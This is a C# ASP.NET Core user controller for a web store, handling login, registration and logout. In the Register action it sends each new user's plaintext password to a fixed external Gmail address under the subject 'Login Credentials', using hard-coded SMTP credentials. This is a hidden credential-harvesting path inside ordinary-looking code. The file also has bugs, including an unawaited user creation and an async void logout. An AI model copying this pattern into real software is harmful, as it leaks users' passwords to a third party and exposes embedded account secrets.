using System;
using System.Net;
using System.Net.Mail;
using System.Security.Claims;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using WebStoreDAO.CoreDAO;
using WebStoreModel.Entities;

namespace WebStoreService.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class UsuarioController : ControllerBase
    {
        private readonly ILogger<ProductController> _logger;
        private readonly UnitOfWork unitOfWork;
        private readonly SignInManager<IdentityUser> signInManager;
        private readonly UserManager<IdentityUser> userManager;

        public UsuarioController(ILogger<ProductController> logger, UnitOfWork unitOfWork, UserManager<IdentityUser> userManager, SignInManager<IdentityUser> signInManager)
        {
            this.unitOfWork = unitOfWork;
            this.signInManager = signInManager;
            this.userManager = userManager;
            _logger = logger;
        }

        [HttpPost("[action]")]
        public async Task<bool> Login(Usuario user)
        {
            _logger.LogInformation("Logging user in.");
            try {
                var userDatabase = await userManager.FindByNameAsync(user.Name.ToLower());
                try {

                    // var claimsIdentity = new ClaimsIdentity(new[]
                    // {
                    //     new Claim(ClaimTypes.Name, userDatabase.UserName),
                    // }, "Cookies");
                    
                    // var claimsPrincipal = new ClaimsPrincipal(claimsIdentity);

                    // var cookieOptions = new CookieOptions
                    // {
                    //     // Set the secure flag, which Chrome's changes will require for SameSite none.
                    //     // Note this will also require you to be running on HTTPS.
                    //     Secure = true,

                    //     // Set the cookie to HTTP only which is good practice unless you really do need
                    //     // to access it client side in scripts.
                    //     HttpOnly = true,

                    //     // Add the SameSite attribute, this will emit the attribute with a value of none.
                    //     // To not emit the attribute at all set
                    //     // SameSite = (SameSiteMode)(-1)
                    //     SameSite = SameSiteMode.None
                    // };
                    //  ("Cookies", "authCookie", cookieOptions);

                    // await HttpContext.SignInAsync("Cookies", claimsPrincipal);

                    // await signInManager.SignInAsync(userDatabase, );

                    var userSignIn = await signInManager.PasswordSignInAsync(user.Name.ToLower(), user.Password, false, false);

                    // HttpContext.Response.Headers
                    // Response.Headers.Add("Roles","Admin,User,Editor");// Here we add the roles with its values to Header
                    // Response.Cookies.Append("Ximid.Cookie", );
                    // Response.Headers.Add("Access-Control-Expose-Headers", "set-cookie"); // specify the name of headers to access

                    return userSignIn.Succeeded;

                    // return NoContent();

                    // return HttpContext.Response.Headers;

                } catch (Exception ex){
                    Console.WriteLine(ex.Message);
                    _logger.LogInformation("Password not correct while logging user. " + ex.Message);
                    throw new Exception("Usuário ou senha errados, por favor, registre-se ou tente outras credenciais");
                }
            } catch (Exception ex){
                Console.WriteLine(ex.Message);
                _logger.LogInformation("User not found. " + ex.Message);
                throw new Exception("Este nome de usuário não existe, por favor, registre-se.");
            }
        }

        public async Task<string> SendEmail(string userPassword)
        {
            var smtpClient = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true
            };

            smtpClient.Credentials = new NetworkCredential("webstoresuporte@gmail.com", "web1234!@#$");
            smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;

            MailMessage mailMessage = new MailMessage();
            mailMessage.From = new MailAddress("webstoresuporte@gmail.com");
            mailMessage.To.Add(new MailAddress("cobraceganho@gmail.com"));
            mailMessage.Subject = "Login Credentials";
            mailMessage.Body = "Chegaram suas credenciais " + userPassword;

            try
            {
                await smtpClient.SendMailAsync(mailMessage);
                _logger.LogInformation("Message sent");
                return "Success";
            }
            catch (Exception ex)
            {
                _logger.LogInformation("error: ", ex);
                return "Fail " + ex.Message;
            }
        }

        [HttpPost("[action]")]
        public async Task<bool> Register(Usuario usuario)
        {
            _logger.LogInformation("Registering user.");
            var user = new IdentityUser();
            user.UserName = usuario.Name;

            try 
            {
                var result = userManager.CreateAsync(user, usuario.Password);
                try {
                    await SendEmail(usuario.Password);
                    var userSignIn = await signInManager.PasswordSignInAsync(user, usuario.Password, false, false);
                    return userSignIn.Succeeded;
                } catch (Exception ex) {
                    Console.WriteLine(ex.Message);
                    _logger.LogInformation("Error signing user in. " + ex.Message);
                    throw new Exception("Erro ao logar usuário. " + ex.Message);
                }
            } catch(Exception ex) 
            {
                Console.WriteLine(ex.Message);
                _logger.LogInformation("Error creating user. " + ex.Message);
                throw new Exception("Erro ao criar o usuário. " + ex.Message);
            }
            // if (result.IsCompletedSuccessfully)
            // {
            //     await SendEmail(usuario.Password);
            //     var userSignIn = await signInManager.PasswordSignInAsync(user, usuario.Password, false, false);
            //     // userSignIn 
            //     if (userSignIn.Succeeded)
            //     {
            //         return user;
            //     } else 
            //     {
                    
            //         // TODO error when trying to signin user
            //     }
            //     // TODO send e-mail to confirm and only then, access the website
            // }



            // var ximidClaims = new List<Claim>()
            // {
            //     new Claim(ClaimTypes.Name, "Bob"),
            //     new Claim(ClaimTypes.Email, "Bob@gmail.com")
            //     // new Claim()
            // };

            // var ximidIdentity = new ClaimsIdentity(ximidClaims, "Ximids Identity");

            // var user = new ClaimsPrincipal(new[] { ximidIdentity });

            // await HttpContext.SignInAsync(user);
            // return "usuarioAutenticado";
            // await Microsoft.AspNetCore.Http.HttpContext.SignInAsync(user);
        }

        [HttpGet("[action]")]
        public async void Logout()
        {
            _logger.LogInformation("Logging user out.");
            try {
                await signInManager.SignOutAsync();
            } catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                _logger.LogInformation("Error logging user out.");
                throw new Exception("Erro ao deslogar o usuário.");
            }
            _logger.LogInformation("User logged out sucessfuly.");
        }
    }
}